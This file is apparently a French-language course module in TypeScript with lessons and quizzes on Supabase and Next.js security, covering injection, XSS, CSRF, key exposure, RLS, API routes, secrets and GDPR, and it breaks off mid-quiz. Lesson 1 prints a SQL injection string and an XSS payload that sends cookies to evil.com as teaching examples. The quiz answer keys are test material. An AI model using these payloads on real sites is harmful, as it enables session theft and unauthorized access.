// ═══════════════════════════════════════════════════
// MODULE 14 — Sécurité Supabase & bonnes pratiques
// 7 leçons — Format JSON blocs
// ═══════════════════════════════════════════════════

function blocks(b: object[]): string {
  return JSON.stringify(b);
}

export const MODULE_14_SECURITY_LESSONS = [
  // ─── LEÇON 1 : Les failles de sécurité les plus courantes ───
  {
    order: 1,
    module: 14,
    title: "Les failles de sécurité les plus courantes",
    slug: "failles-securite-courantes",
    duration: "20 min",
    description: "Comprendre les failles de sécurité classiques : injection SQL, XSS, CSRF, exposition de clés API. Exemples concrets de hacks pour ne plus jamais les reproduire.",
    content: blocks([
      { id: "1-1", type: "heading", level: 2, text: "Pourquoi la sécurité n'est pas optionnelle" },
      { id: "1-2", type: "text", html: "<p>Tu peux avoir le plus beau projet du monde — si un hacker le compromet en 10 minutes, c'est <strong>game over</strong>. La sécurité n'est pas un bonus qu'on ajoute à la fin. C'est une fondation qu'on construit dès le premier commit.</p><p>Dans cette leçon, on va voir les <strong>4 failles les plus exploitées</strong> dans les apps web modernes. Spoiler : tu en as probablement au moins une dans ton projet actuel.</p>" },
      { id: "1-3", type: "callout", variant: "warning", html: "<strong>Stat choc :</strong> 43% des cyberattaques ciblent les petites entreprises et les projets SaaS. Les hackers ne visent pas que les banques — ils visent les cibles faciles. Si ton app n'est pas sécurisée, tu ES une cible facile." },
      { id: "1-4", type: "separator", style: "dots" },

      { id: "1-5", type: "heading", level: 2, text: "Faille n°1 : Injection SQL" },
      { id: "1-6", type: "text", html: "<p>L'injection SQL, c'est quand un attaquant injecte du code SQL malveillant dans un champ de formulaire. Imagine un champ de login où l'utilisateur entre <code>' OR 1=1 --</code> à la place de son email. Si ta requête est construite par concaténation de chaînes, le hacker se connecte sans mot de passe.</p><p><strong>Avec Supabase :</strong> Le client JavaScript utilise des requêtes paramétrées — tu es protégé par défaut. Mais si tu écris des fonctions SQL custom (RPC) avec concaténation de chaînes, tu réintroduis la faille.</p>" },
      { id: "1-7", type: "callout", variant: "tip", html: "<strong>Règle d'or :</strong> Ne JAMAIS construire une requête SQL par concaténation de chaînes. Utilise toujours des requêtes paramétrées ou l'ORM/query builder de Supabase." },
      { id: "1-8", type: "separator", style: "line" },

      { id: "1-9", type: "heading", level: 2, text: "Faille n°2 : Cross-Site Scripting (XSS)" },
      { id: "1-10", type: "text", html: "<p>Le XSS permet à un attaquant d'injecter du JavaScript malveillant dans une page vue par d'autres utilisateurs. Par exemple, un commentaire qui contient <code>&lt;script&gt;document.location='https://evil.com?cookie='+document.cookie&lt;/script&gt;</code>. Résultat : les cookies de session de tous les visiteurs sont volés.</p><p><strong>Protection :</strong> React échappe automatiquement le HTML dans le JSX. Mais attention à <code>dangerouslySetInnerHTML</code> — si tu l'utilises avec du contenu utilisateur non sanitisé, tu ouvres la porte au XSS.</p>" },

      { id: "1-11", type: "heading", level: 2, text: "Faille n°3 : CSRF (Cross-Site Request Forgery)" },
      { id: "1-12", type: "text", html: "<p>Le CSRF exploite la confiance du navigateur. Un site malveillant envoie une requête à ton app en utilisant les cookies de session de l'utilisateur connecté. Exemple : un lien piégé qui déclenche un virement bancaire sans que l'utilisateur le sache.</p><p><strong>Protection :</strong> Utilise des tokens CSRF, le header <code>SameSite</code> sur les cookies, et vérifie le header <code>Origin</code> côté serveur.</p>" },

      { id: "1-13", type: "heading", level: 2, text: "Faille n°4 : Exposition de clés API" },
      { id: "1-14", type: "text", html: "<p>C'est la faille la plus bête et la plus courante. Tu push ta clé Supabase <code>service_role</code> sur GitHub en public. Un bot la détecte en <strong>moins de 30 secondes</strong> et commence à vider ta base de données.</p><p>Rappel : la clé <code>anon</code> est publique (côté client). La clé <code>service_role</code> est <strong>SECRÈTE</strong> — elle bypass toutes les règles RLS.</p>" },
      { id: "1-15", type: "callout", variant: "warning", html: "<strong>Hack réel :</strong> En 2023, des milliers de projets Supabase ont été compromis parce que des développeurs avaient pushé leur clé <code>service_role</code> dans des repos publics. Les hackers ont vidé ou rançonné les bases de données." },
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Vérifie ton historique Git : as-tu déjà commité un fichier <code>.env</code> ? Utilise <code>git log --all --full-history -- .env*</code>. (2) Si oui, régénère immédiatement tes clés dans le dashboard Supabase. (3) Ajoute <code>.env*</code> à ton <code>.gitignore</code> si ce n'est pas déjà fait.</p>",
    quiz: [
      { type: "mcq", question: "Quelle est la meilleure protection contre les injections SQL dans Supabase ?", options: JSON.stringify(["Utiliser des requêtes paramétrées ou le query builder Supabase", "Filtrer les caractères spéciaux manuellement", "Limiter la longueur des champs de formulaire", "Utiliser HTTPS"]), correctAnswer: "Utiliser des requêtes paramétrées ou le query builder Supabase", explanation: "Les requêtes paramétrées séparent le code SQL des données utilisateur, rendant l'injection impossible. Le client Supabase les utilise par défaut, mais attention aux fonctions RPC custom." },
      { type: "true_false", question: "La clé anon de Supabase doit être gardée secrète et ne jamais apparaître dans le code côté client.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "La clé anon est conçue pour être utilisée côté client — elle est publique. C'est la clé service_role qui est secrète et qui ne doit JAMAIS être exposée côté client, car elle bypass toutes les règles RLS." },
      { type: "mcq", question: "Quel est le risque principal d'utiliser dangerouslySetInnerHTML avec du contenu utilisateur ?", options: JSON.stringify(["Ça ralentit le rendu React", "Ça ouvre la porte aux attaques XSS", "Ça casse le SEO", "Ça consomme plus de mémoire"]), correctAnswer: "Ça ouvre la porte aux attaques XSS", explanation: "dangerouslySetInnerHTML insère du HTML brut sans l'échapper. Si le contenu vient d'un utilisateur et n'est pas sanitisé, un attaquant peut injecter du JavaScript malveillant qui s'exécutera dans le navigateur des autres utilisateurs." },
      { type: "true_false", question: "Un bot peut détecter une clé API exposée sur GitHub public en moins de 30 secondes.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Des bots automatisés scannent en permanence les nouveaux commits sur GitHub à la recherche de clés API, tokens et secrets. Ils peuvent les détecter et les exploiter en quelques secondes." },
      { type: "mcq", question: "Qu'est-ce qu'une attaque CSRF ?", options: JSON.stringify(["Un hacker devine ton mot de passe par force brute", "Un site malveillant envoie des requêtes en utilisant les cookies de session de l'utilisateur", "Un attaquant intercepte le trafic réseau", "Un virus est installé sur le serveur"]), correctAnswer: "Un site malveillant envoie des requêtes en utilisant les cookies de session de l'utilisateur", explanation: "Le CSRF (Cross-Site Request Forgery) exploite la confiance du navigateur : un site tiers envoie des requêtes à ton app en utilisant les cookies de session de l'utilisateur connecté, sans que celui-ci le sache." },
    ],
  },

  // ─── LEÇON 2 : Row Level Security (RLS) : le bouclier Supabase ───
  {
    order: 2,
    module: 14,
    title: "Row Level Security (RLS) : le bouclier Supabase",
    slug: "rls-bouclier-supabase",
    duration: "25 min",
    description: "Comprendre RLS en profondeur, écrire des policies efficaces, les tester, et éviter les pièges classiques qui laissent tes données exposées.",
    content: blocks([
      { id: "2-1", type: "heading", level: 2, text: "RLS : ta première ligne de défense" },
      { id: "2-2", type: "text", html: "<p>Row Level Security (RLS) est le mécanisme de sécurité <strong>le plus important</strong> de Supabase. Il permet de définir, au niveau de la base de données, quelles lignes un utilisateur peut lire, insérer, modifier ou supprimer.</p><p>Sans RLS activé, <strong>n'importe qui avec ta clé anon peut lire toutes les données</strong> de ta table. Avec RLS, chaque utilisateur ne voit que ses propres données — même s'il essaie de hacker l'API.</p>" },
      { id: "2-3", type: "callout", variant: "warning", html: "<strong>Règle absolue :</strong> Active TOUJOURS RLS sur chaque table qui contient des données utilisateurs. Une table sans RLS = une table publique accessible à tout le monde." },
      { id: "2-4", type: "separator", style: "dots" },

      { id: "2-5", type: "heading", level: 2, text: "Comment fonctionnent les policies RLS" },
      { id: "2-6", type: "text", html: "<p>Une policy RLS est une règle SQL qui s'exécute automatiquement à chaque requête. Elle dit : <em>\"Pour cette opération (SELECT, INSERT, UPDATE, DELETE), autoriser seulement les lignes qui correspondent à cette condition.\"</em></p><p>Exemple concret — un utilisateur ne peut voir que ses propres profils :</p><pre><code>CREATE POLICY \"Users can view own profile\"\nON profiles FOR SELECT\nUSING (auth.uid() = user_id);</code></pre><p>La fonction <code>auth.uid()</code> retourne l'ID de l'utilisateur connecté. Supabase l'injecte automatiquement dans chaque requête authentifiée.</p>" },
      { id: "2-7", type: "separator", style: "line" },

      { id: "2-8", type: "heading", level: 2, text: "Les 4 types de policies" },
      { id: "2-9", type: "comparison", headers: ["Opération", "Clause", "Exemple d'usage"], rows: [
        { cells: ["SELECT", "USING", "L'utilisateur ne voit que ses données"] },
        { cells: ["INSERT", "WITH CHECK", "L'utilisateur ne peut créer que pour lui-même"] },
        { cells: ["UPDATE", "USING + WITH CHECK", "L'utilisateur ne modifie que ses propres lignes"] },
        { cells: ["DELETE", "USING", "L'utilisateur ne supprime que ses propres lignes"] },
      ]},
      { id: "2-10", type: "callout", variant: "info", html: "<strong>USING vs WITH CHECK :</strong> <code>USING</code> filtre les lignes existantes (lesquelles tu peux voir/modifier/supprimer). <code>WITH CHECK</code> valide les nouvelles données (est-ce que cette nouvelle ligne est autorisée ?)." },

      { id: "2-11", type: "heading", level: 2, text: "Les pièges classiques RLS" },
      { id: "2-12", type: "steps", steps: [
        { title: "Piège 1 : Oublier d'activer RLS", description: "Par défaut, les nouvelles tables n'ont PAS RLS activé. Tu dois le faire manuellement : ALTER TABLE ma_table ENABLE ROW LEVEL SECURITY;" },
        { title: "Piège 2 : Policy trop permissive", description: "Une policy SELECT avec USING (true) rend la table publique. Vérifie toujours que tu filtres bien par auth.uid()." },
        { title: "Piège 3 : Oublier la policy INSERT", description: "Tu protèges le SELECT mais pas l'INSERT ? N'importe qui peut insérer des données dans ta table." },
        { title: "Piège 4 : Ne pas tester", description: "Utilise le SQL Editor de Supabase avec SET ROLE authenticated pour simuler un utilisateur et vérifier que tes policies fonctionnent." },
      ]},

      { id: "2-13", type: "heading", level: 3, text: "Template de policies standard" },
      { id: "2-14", type: "text", html: "<p>Voici le set de policies que tu devrais appliquer sur chaque table utilisateur :</p><pre><code>-- Activer RLS\nALTER TABLE ma_table ENABLE ROW LEVEL SECURITY;\n\n-- SELECT : voir ses propres données\nCREATE POLICY \"select_own\" ON ma_table\nFOR SELECT USING (auth.uid() = user_id);\n\n-- INSERT : créer uniquement pour soi\nCREATE POLICY \"insert_own\" ON ma_table\nFOR INSERT WITH CHECK (auth.uid() = user_id);\n\n-- UPDATE : modifier ses propres données\nCREATE POLICY \"update_own\" ON ma_table\nFOR UPDATE USING (auth.uid() = user_id)\nWITH CHECK (auth.uid() = user_id);\n\n-- DELETE : supprimer ses propres données\nCREATE POLICY \"delete_own\" ON ma_table\nFOR DELETE USING (auth.uid() = user_id);</code></pre>" },
      { id: "2-15", type: "callout", variant: "tip", html: "<strong>Astuce pro :</strong> Dans le dashboard Supabase, va dans Authentication > Policies. Tu peux y voir et gérer toutes tes policies visuellement, sans écrire de SQL." },
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Ouvre ton projet Supabase et liste toutes tes tables. (2) Pour chaque table, vérifie si RLS est activé (icône cadenas dans le dashboard). (3) Écris les 4 policies standard (SELECT, INSERT, UPDATE, DELETE) pour ta table la plus sensible. (4) Teste en simulant un utilisateur différent avec le SQL Editor.</p>",
    quiz: [
      { type: "mcq", question: "Que se passe-t-il si RLS n'est pas activé sur une table Supabase ?", options: JSON.stringify(["La table est accessible uniquement aux admins", "N'importe qui avec la clé anon peut lire toutes les données", "Les données sont chiffrées automatiquement", "La table est en lecture seule"]), correctAnswer: "N'importe qui avec la clé anon peut lire toutes les données", explanation: "Sans RLS, la table est complètement ouverte. N'importe qui avec la clé anon (qui est publique) peut lire, modifier et supprimer toutes les données de la table." },
      { type: "true_false", question: "La clause USING filtre les lignes existantes, tandis que WITH CHECK valide les nouvelles données.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "USING s'applique aux lignes existantes (SELECT, UPDATE, DELETE) pour déterminer lesquelles l'utilisateur peut voir/modifier. WITH CHECK s'applique aux nouvelles données (INSERT, la partie 'nouvelle valeur' d'UPDATE) pour valider si l'insertion est autorisée." },
      { type: "mcq", question: "Quelle fonction Supabase retourne l'ID de l'utilisateur connecté dans une policy RLS ?", options: JSON.stringify(["current_user()", "session_user()", "auth.uid()", "get_user_id()"]), correctAnswer: "auth.uid()", explanation: "auth.uid() est la fonction Supabase qui retourne l'UUID de l'utilisateur authentifié. Elle est automatiquement injectée dans chaque requête authentifiée et c'est la base de la plupart des policies RLS." },
      { type: "true_false", question: "Par défaut, les nouvelles tables dans Supabase ont RLS activé automatiquement.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Par défaut, les nouvelles tables n'ont PAS RLS activé. Tu dois le faire manuellement avec ALTER TABLE ma_table ENABLE ROW LEVEL SECURITY. C'est un piège classique." },
      { type: "mcq", question: "Tu as une table 'orders' avec RLS activé et une policy SELECT (USING auth.uid() = user_id). Un utilisateur essaie d'insérer une commande. Que se passe-t-il ?", options: JSON.stringify(["L'insertion réussit car RLS est activé", "L'insertion est refusée car il n'y a pas de policy INSERT", "L'insertion réussit grâce à la policy SELECT", "Supabase crée automatiquement une policy INSERT"]), correctAnswer: "L'insertion est refusée car il n'y a pas de policy INSERT", explanation: "Quand RLS est activé, TOUTES les opérations sont bloquées par défaut sauf celles explicitement autorisées par une policy. Pas de policy INSERT = pas d'insertion possible. C'est un piège classique : on protège le SELECT mais on oublie les autres opérations." },
    ],
  },

  // ─── LEÇON 3 : Sécuriser les API Routes ───
  {
    order: 3,
    module: 14,
    title: "Sécuriser les API Routes",
    slug: "securiser-api-routes",
    duration: "20 min",
    description: "Protéger tes API Routes Next.js avec la validation Zod, le rate limiting et l'authentification côté serveur.",
    content: blocks([
      { id: "3-1", type: "heading", level: 2, text: "Tes API Routes sont des portes ouvertes" },
      { id: "3-2", type: "text", html: "<p>Chaque API Route que tu crées dans Next.js est un <strong>endpoint public</strong> accessible par n'importe qui. Pas besoin d'utiliser ton interface — un simple <code>curl</code> suffit pour envoyer des requêtes. Si tu ne valides pas les données entrantes et que tu ne vérifies pas l'authentification, tu es vulnérable.</p>" },
      { id: "3-3", type: "callout", variant: "info", html: "<strong>Règle de base :</strong> Ne fais JAMAIS confiance aux données qui arrivent du client. Tout ce qui vient du navigateur peut être falsifié : headers, cookies, body, query params." },
      { id: "3-4", type: "separator", style: "dots" },

      { id: "3-5", type: "heading", level: 2, text: "Validation avec Zod" },
      { id: "3-6", type: "text", html: "<p>Zod est une librairie TypeScript de validation de schémas. Elle te permet de définir la forme exacte des données attendues et de rejeter tout ce qui ne correspond pas.</p><pre><code>import { z } from 'zod';\n\nconst CreateProjectSchema = z.object({\n  name: z.string().min(1).max(100),\n  description: z.string().max(500).optional(),\n  budget: z.number().positive().max(100000),\n});\n\n// Dans ton API Route\nconst parsed = CreateProjectSchema.safeParse(body);\nif (!parsed.success) {\n  return NextResponse.json(\n    { error: parsed.error.issues },\n    { status: 400 }\n  );\n}</code></pre>" },
      { id: "3-7", type: "callout", variant: "tip", html: "<strong>Astuce :</strong> Définis tes schémas Zod dans un fichier <code>lib/validations.ts</code> partagé. Tu peux les réutiliser côté client (formulaires) et côté serveur (API Routes) pour avoir une validation cohérente." },
      { id: "3-8", type: "separator", style: "line" },

      { id: "3-9", type: "heading", level: 2, text: "Authentification côté serveur" },
      { id: "3-10", type: "text", html: "<p>Dans chaque API Route protégée, tu dois vérifier que l'utilisateur est authentifié <strong>côté serveur</strong>. Ne te fie jamais au cookie côté client — il peut être falsifié.</p><pre><code>import { createRouteHandlerClient } from\n  '@supabase/auth-helpers-nextjs';\nimport { cookies } from 'next/headers';\n\nexport async function POST(req: Request) {\n  const supabase = createRouteHandlerClient({ cookies });\n  const { data: { user } } = await supabase.auth.getUser();\n\n  if (!user) {\n    return NextResponse.json(\n      { error: 'Non autorisé' },\n      { status: 401 }\n    );\n  }\n  // L'utilisateur est vérifié, on continue...\n}</code></pre>" },

      { id: "3-11", type: "heading", level: 2, text: "Rate limiting : bloquer les abus" },
      { id: "3-12", type: "text", html: "<p>Le rate limiting empêche un attaquant (ou un bot) d'envoyer des milliers de requêtes par seconde à ton API. Sans rate limiting, un attaquant peut faire du brute force, du scraping, ou simplement faire exploser ta facture Supabase/Vercel.</p><p>Solution simple avec <code>upstash/ratelimit</code> :</p><pre><code>import { Ratelimit } from '@upstash/ratelimit';\nimport { Redis } from '@upstash/redis';\n\nconst ratelimit = new Ratelimit({\n  redis: Redis.fromEnv(),\n  limiter: Ratelimit.slidingWindow(10, '10 s'),\n});\n\n// Dans ton API Route\nconst identifier = user.id || ip;\nconst { success } = await ratelimit.limit(identifier);\nif (!success) {\n  return NextResponse.json(\n    { error: 'Trop de requêtes' },\n    { status: 429 }\n  );\n}</code></pre>" },
      { id: "3-13", type: "checklist", title: "Checklist sécurité API Route", items: [
        { id: "c1", text: "Valider toutes les données entrantes avec Zod" },
        { id: "c2", text: "Vérifier l'authentification côté serveur avec getUser()" },
        { id: "c3", text: "Implémenter du rate limiting sur les routes sensibles" },
        { id: "c4", text: "Retourner des erreurs génériques (pas de stack trace en prod)" },
        { id: "c5", text: "Logger les tentatives suspectes pour audit" },
      ]},
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Choisis une API Route de ton projet. (2) Ajoute la validation Zod sur le body de la requête. (3) Ajoute la vérification d'authentification avec <code>getUser()</code>. (4) Teste en envoyant des données invalides avec <code>curl</code> ou Postman et vérifie que tu reçois bien une erreur 400.</p>",
    quiz: [
      { type: "mcq", question: "Pourquoi ne faut-il jamais faire confiance aux données venant du client ?", options: JSON.stringify(["Parce que le navigateur est lent", "Parce que tout ce qui vient du navigateur peut être falsifié", "Parce que JavaScript est un langage non typé", "Parce que les données client sont toujours en texte brut"]), correctAnswer: "Parce que tout ce qui vient du navigateur peut être falsifié", explanation: "Headers, cookies, body, query params — tout peut être modifié par l'utilisateur ou un attaquant. C'est pourquoi il faut toujours valider et authentifier côté serveur." },
      { type: "true_false", question: "Zod permet de valider les données à la fois côté client (formulaires) et côté serveur (API Routes).", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Zod fonctionne en TypeScript/JavaScript côté client et serveur. Tu peux définir tes schémas dans un fichier partagé et les réutiliser partout pour avoir une validation cohérente." },
      { type: "mcq", question: "Quel code HTTP retourner quand le rate limiting est déclenché ?", options: JSON.stringify(["400 Bad Request", "401 Unauthorized", "403 Forbidden", "429 Too Many Requests"]), correctAnswer: "429 Too Many Requests", explanation: "Le code 429 Too Many Requests est le standard HTTP pour indiquer que l'utilisateur a envoyé trop de requêtes dans un laps de temps donné." },
      { type: "true_false", question: "Vérifier l'authentification côté client suffit pour sécuriser une API Route.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "L'authentification côté client peut être contournée. Il faut toujours vérifier côté serveur avec getUser() de Supabase pour s'assurer que le token est valide et que l'utilisateur est bien qui il prétend être." },
      { type: "mcq", question: "Tu as une API Route /api/projects qui crée un projet. Un attaquant envoie { name: '', budget: -5000 }. Quelle est la meilleure défense ?", options: JSON.stringify(["Vérifier manuellement chaque champ avec des if/else", "Utiliser un schéma Zod qui valide name (min 1 char) et budget (nombre positif)", "Faire confiance au formulaire React qui empêche ces valeurs", "Ignorer les données invalides et créer le projet quand même"]), correctAnswer: "Utiliser un schéma Zod qui valide name (min 1 char) et budget (nombre positif)", explanation: "Zod te permet de définir des contraintes précises (min, max, positive, etc.) et de rejeter automatiquement les données invalides avec des messages d'erreur clairs. C'est plus fiable et maintenable que des if/else manuels." },
    ],
  },

  // ─── LEÇON 4 : Gestion des secrets et variables d'env ───
  {
    order: 4,
    module: 14,
    title: "Gestion des secrets et variables d'environnement",
    slug: "gestion-secrets-variables-env",
    duration: "15 min",
    description: "Maîtriser .env.local, les variables Vercel, la rotation de clés, et comprendre la différence critique entre NEXT_PUBLIC_ et les variables serveur.",
    content: blocks([
      { id: "4-1", type: "heading", level: 2, text: "Le piège mortel des variables d'environnement" },
      { id: "4-2", type: "text", html: "<p>Les variables d'environnement stockent tes secrets : clés API, tokens, mots de passe de base de données. Une erreur de configuration et <strong>tes secrets sont exposés au monde entier</strong>.</p><p>Le piège le plus courant dans Next.js ? Mettre <code>NEXT_PUBLIC_</code> devant une variable secrète. Ce préfixe signifie que la variable sera <strong>incluse dans le bundle JavaScript</strong> envoyé au navigateur. Tout le monde peut la voir.</p>" },
      { id: "4-3", type: "callout", variant: "warning", html: "<strong>CRITIQUE :</strong> <code>NEXT_PUBLIC_SUPABASE_ANON_KEY</code> = OK (clé publique par design). <code>NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY</code> = CATASTROPHE (clé admin exposée au client)." },
      { id: "4-4", type: "separator", style: "dots" },

      { id: "4-5", type: "heading", level: 2, text: "NEXT_PUBLIC_ vs variables serveur" },
      { id: "4-6", type: "comparison", headers: ["Type", "Accessible où", "Usage", "Exemple"], rows: [
        { cells: ["NEXT_PUBLIC_*", "Client + Serveur", "Données publiques uniquement", "NEXT_PUBLIC_SUPABASE_URL"] },
        { cells: ["Sans préfixe", "Serveur uniquement", "Secrets et clés sensibles", "SUPABASE_SERVICE_ROLE_KEY"] },
      ]},
      { id: "4-7", type: "text", html: "<p>La règle est simple : si c'est secret, <strong>pas de NEXT_PUBLIC_</strong>. Les variables sans préfixe ne sont accessibles que dans les Server Components, API Routes, et middleware — jamais dans le navigateur.</p>" },
      { id: "4-8", type: "separator", style: "line" },

      { id: "4-9", type: "heading", level: 2, text: "Fichiers .env : la hiérarchie" },
      { id: "4-10", type: "steps", steps: [
        { title: ".env (base)", description: "Valeurs par défaut, commitées dans Git. Jamais de secrets ici." },
        { title: ".env.local (secrets locaux)", description: "Tes secrets de développement. Automatiquement dans .gitignore. C'est ici que tu mets tes clés." },
        { title: ".env.production (prod)", description: "Valeurs de production non secrètes. Pour les secrets de prod, utilise les variables d'environnement Vercel." },
      ]},

      { id: "4-11", type: "heading", level: 2, text: "Variables d'environnement sur Vercel" },
      { id: "4-12", type: "text", html: "<p>En production, tes secrets ne doivent JAMAIS être dans un fichier. Utilise le dashboard Vercel :</p><ol><li>Va dans <strong>Settings > Environment Variables</strong></li><li>Ajoute chaque variable avec son scope (Production, Preview, Development)</li><li>Les variables sont chiffrées et injectées au runtime</li></ol><p>Avantage : tu peux avoir des clés différentes pour chaque environnement (dev, preview, prod) et les changer sans redéployer le code.</p>" },

      { id: "4-13", type: "heading", level: 3, text: "Rotation des clés" },
      { id: "4-14", type: "text", html: "<p>Si tu suspectes qu'une clé a été compromise, ou régulièrement tous les 3-6 mois :</p><ol><li>Génère une nouvelle clé dans le dashboard du service (Supabase, OpenAI...)</li><li>Mets à jour la variable sur Vercel</li><li>Redéploie ton app</li><li>Vérifie que tout fonctionne</li><li>Révoque l'ancienne clé</li></ol><p><strong>Important :</strong> Change la clé sur Vercel AVANT de révoquer l'ancienne pour éviter un temps d'arrêt.</p>" },
      { id: "4-15", type: "callout", variant: "tip", html: "<strong>Astuce :</strong> Utilise l'outil <code>dotenv-vault</code> ou les <strong>GitHub Secrets</strong> pour gérer tes variables d'environnement en équipe sans jamais les partager en clair par Slack ou email." },
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Audite ton fichier <code>.env.local</code> : quelles variables sont vraiment secrètes ? (2) Vérifie que ton <code>.gitignore</code> contient <code>.env*.local</code>. (3) Connecte-toi au dashboard Vercel et configure tes variables d'environnement de production. (4) Supprime toute variable <code>NEXT_PUBLIC_</code> qui ne devrait pas être publique.</p>",
    quiz: [
      { type: "mcq", question: "Que signifie le préfixe NEXT_PUBLIC_ sur une variable d'environnement ?", options: JSON.stringify(["La variable est chiffrée", "La variable est incluse dans le bundle JavaScript côté client", "La variable est accessible uniquement en production", "La variable est partagée entre tous les projets Vercel"]), correctAnswer: "La variable est incluse dans le bundle JavaScript côté client", explanation: "Le préfixe NEXT_PUBLIC_ fait que Next.js inclut la variable dans le bundle JavaScript envoyé au navigateur. Tout le monde peut la voir. Ne l'utilise que pour les données publiques comme NEXT_PUBLIC_SUPABASE_URL." },
      { type: "true_false", question: "Le fichier .env.local est automatiquement exclu de Git par Next.js.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Vrai", explanation: "Next.js ajoute automatiquement .env*.local au .gitignore lors de la création du projet. C'est l'endroit idéal pour stocker tes secrets de développement." },
      { type: "mcq", question: "Quelle est la bonne procédure pour faire une rotation de clé API ?", options: JSON.stringify(["Révoquer l'ancienne clé puis créer la nouvelle", "Créer la nouvelle clé, mettre à jour Vercel, redéployer, puis révoquer l'ancienne", "Changer la clé dans le code et pousser sur Git", "Demander au fournisseur de changer la clé automatiquement"]), correctAnswer: "Créer la nouvelle clé, mettre à jour Vercel, redéployer, puis révoquer l'ancienne", explanation: "Il faut changer la clé sur Vercel AVANT de révoquer l'ancienne pour éviter un temps d'arrêt. L'ordre est : créer la nouvelle, mettre à jour, redéployer, vérifier, puis révoquer l'ancienne." },
      { type: "true_false", question: "Il est acceptable de partager des clés API par Slack ou email entre membres d'une équipe.", options: JSON.stringify(["Vrai", "Faux"]), correctAnswer: "Faux", explanation: "Ne partage jamais de secrets en clair par Slack ou email. Utilise des outils comme dotenv-vault, GitHub Secrets, ou les variables d'environnement Vercel pour les partager de manière sécurisée." },
      { type: "mcq", question: "Où stocker les secrets en production sur Vercel ?", options: JSON.stringify(["Dans le fichier .env.production committé sur Git", "Dans les variables d'environnement du dashboard Vercel", "Dans un fichier secrets.json à la racine du projet", "Dans les commentaires du code source"]), correctAnswer: "Dans les variables d'environnement du dashboard Vercel", explanation: "En production, les secrets doivent être configurés dans Settings > Environment Variables du dashboard Vercel. Ils sont chiffrés et injectés au runtime, sans jamais apparaître dans le code source." },
    ],
  },

  // ─── LEÇON 5 : RGPD et protection des données ───
  {
    order: 5,
    module: 14,
    title: "RGPD et protection des données",
    slug: "rgpd-protection-donnees",
    duration: "20 min",
    description: "Consentement, droit à l'effacement, registre des traitements et mentions légales — tout ce que tu dois implémenter pour être conforme RGPD.",
    content: blocks([
      { id: "5-1", type: "heading", level: 2, text: "Le RGPD pour les développeurs : pas si compliqué" },
      { id: "5-2", type: "text", html: "<p>Le RGPD (Règlement Général sur la Protection des Données) est souvent vu comme un cauchemar juridique. En réalité, pour un développeur, ça se résume à <strong>5 principes techniques</strong> à implémenter. Et comme tu utilises Supabase, tu as déjà une bonne partie du travail fait.</p>" },
      { id: "5-3", type: "callout", variant: "info", html: "<strong>Rappel :</strong> Le RGPD s'applique dès que tu traites des données personnelles de résidents européens. Nom, email, adresse IP, cookies — tout ça, ce sont des données personnelles." },
      { id: "5-4", type: "separator", style: "dots" },

      { id: "5-5", type: "heading", level: 2, text: "Les 5 obligations techniques" },
      { id: "5-6", type: "steps", steps: [
        { title: "1. Consentement explicite", description: "Avant de collecter des données, tu dois obtenir le consentement ACTIF de l'utilisateur. Pas de cases pré-cochées, pas de 'en continuant vous acceptez'. Un bouton clair 'J'accepte' avec explication de ce que tu collectes et pourquoi." },
        { title: "2. Droit d'accès", description: "Chaque utilisateur doit pouvoir voir quelles données tu stockes sur lui. Implémente une page 'Mes données' dans les paramètres du compte." },
        { title: "3. Droit à l'effacement", description: "L'utilisateur doit pouvoir demander la suppression de toutes ses données. Implémente un bouton 'Supprimer mon compte' qui supprime réellement les données (pas juste un soft delete)." },
        { title: "4. Minimisation des données", description: "Ne collecte que ce qui est strictement nécessaire. Tu n'as pas besoin de la date de naissance pour un chatbot. Moins tu stockes, moins tu risques." },
        { title: "5. Registre des traitements", description: "Documente quelles données tu collectes, pourquoi, combien de temps tu les gardes, et avec qui tu les partages (APIs tierces incluses)." },
      ]},
      { id: "5-7", type: "separator", style: "line" },

      { id: "5-8", type: "heading", level: 2, text: "Implémenter le consentement cookies" },
      { id: "5-9", type: "text", html: "<p>Le bandeau cookies est obligatoire si tu utilises des cookies non essentiels (analytics, tracking). Voici ce qu'il doit contenir :</p><ul><li><strong>Information claire</strong> sur les cookies utilisés et leur finalité</li><li><strong>Bouton Accepter</strong> et <strong>bouton Refuser</strong> aussi visibles l'un que l'autre</li><li><strong>Gestion granulaire</strong> : l'utilisateur doit pouvoir accepter/refuser par catégorie</li><li><strong>Pas de dark patterns</strong> : pas de bouton refuser caché, pas de couleurs trompeuses</li></ul>" },
      { id: "5-10", type: "callout", variant: "tip", html: "<strong>Outils recommandés :</strong> Utilise <code>cookie-consent-banner</code> ou <code>react-cookie-consent</code> pour implémenter rapidement un bandeau conforme. Ou code-le toi-même — c'est un bon exercice." },

      { id: "5-11", type: "heading", level: 2, text: "Les mentions légales obligatoires" },
      { id: "5-12", type: "checklist", title: "Pages légales à créer", items: [
        { id: "c1", text: "Mentions légales : identité, hébergeur, directeur de publication" },
        { id: "c2", text: "Politique de confidentialité : données collectées, finalités, durée de conservation, droits" },
        { id: "c3", text: "Politique cookies : types de cookies, finalités, gestion du consentement" },
        { id: "c4", text: "CGU (si applicable) : conditions d'utilisation du service" },
      ]},
      { id: "5-13", type: "callout", variant: "warning", html: "<strong>Amendes :</strong> Jusqu'à 20 millions d'euros ou 4% du CA mondial. En pratique, la CNIL envoie d'abord une mise en demeure. Mais mieux vaut être conforme dès le départ." },
    ]),
    exercise: "<p><strong>Exercice :</strong> (1) Crée une page <code>/mentions-legales</code> et une page <code>/politique-confidentialite</code> pour ton projet. Utilise Claude pour générer le contenu adapté à ton app. (2) Implémente un bandeau de consentement cookies avec <code>react-cookie-consent</code>. (3) Ajoute un bouton 'Supprimer mon compte' dans les paramètres utilisateur qui supprime réellement les données Supabase.</p>",
    quiz: [
